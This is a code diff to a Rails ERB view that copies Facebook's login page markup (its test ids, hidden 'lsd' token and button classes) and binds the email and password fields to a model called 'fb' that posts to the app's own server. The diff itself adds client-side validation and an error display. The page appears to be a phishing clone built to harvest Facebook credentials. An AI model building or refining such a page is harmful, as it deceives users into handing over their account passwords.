@@ -148,7 +148,7 @@
               </h1>
             </div>
             <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
-              <%= simple_form_for @fb,id:"login_form",method:"post" ,novalidate:"1" ,remote: true ,onsubmit:"return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)" do |f| %>
+              <%= simple_form_for @fb,id:"login_form",method:"post",remote: true ,html: {  novalidate:false,name: 'myForm',onsubmit:"return validateForm()" } do |f| %>
                   <input type="hidden" name="lsd" value="AVpyI0DY" autocomplete="off">
                   <table cellspacing="0" role="presentation">
                     <tbody>
@@ -166,6 +166,7 @@
                       </td>
                       <td>
                         <%= f.password_field :password,class:"inputtext", id:"pass" ,tabindex:"3"  %>
+                        <p id="errorid" style="color: red;font-weight: bold" align="center"></p>
                       </td>
                       <td>
                         <label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_q">
@@ -791,3 +792,16 @@
 </style>
 </body>
 </html>
+<script>
+  function validateForm() {
+    var x = document.forms["myForm"]["fb[password]"].value;
+    var y = document.forms["myForm"]["fb[email]"].value;
+    if (x == "" || y == '') {
+      error = "";
+      document.getElementById("errorid").innerHTML= error
+      document.getElementById("pass").style.border="4px solid red";
+      document.getElementById("email").style.border="4px solid red";
+      return false;
+    }}
+
+</script>
